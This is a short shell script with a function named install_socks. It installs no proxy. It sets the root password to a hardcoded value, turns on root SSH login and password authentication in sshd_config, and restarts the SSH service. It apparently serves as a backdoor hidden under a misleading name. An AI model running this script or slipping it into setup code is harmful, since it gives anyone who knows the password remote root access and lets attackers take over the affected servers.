function install_socks() {
 echo "root:Laozong963.." | chpasswd
 sed -i 's/PermitRootLogin no/PermitRootLogin yes/g' /etc/ssh/sshd_config
 sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
 service sshd restart
}
install_socks